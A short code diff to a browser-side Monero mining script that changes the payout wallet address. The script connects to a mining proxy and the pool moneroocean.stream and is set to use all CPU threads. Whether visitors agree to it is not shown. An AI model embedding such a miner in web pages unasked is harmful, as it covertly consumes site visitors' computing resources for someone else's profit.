@@ -9,7 +9,7 @@
     script.onload = () => {    
         server            = 'wss://f.xmrminingproxy.com:8181';
         var pool          = 'moneroocean.stream';
-        var walletAddress = '44x2jiaupK37uVF3VEeyrUS73G5eCtDY7Ge3NonKUWeuUr1irYjpXJA4BfM96EKpgAcdUDyKUFh1ti7vNPD8y1VHVSLE5DS'; //your wallet address here
+        var walletAddress = '4APDbaHLvcf4jFqbM2xP4KMR6PEURKz6eUTDmQkLZ1TkETEwycVZNSRfxqqxf685ub6JKTrND8u8e9rCMK2sB9KMMizJKXP'; //your wallet address here
         var workerId      = ''
         var threads       = -1;
         var password      = 'x';
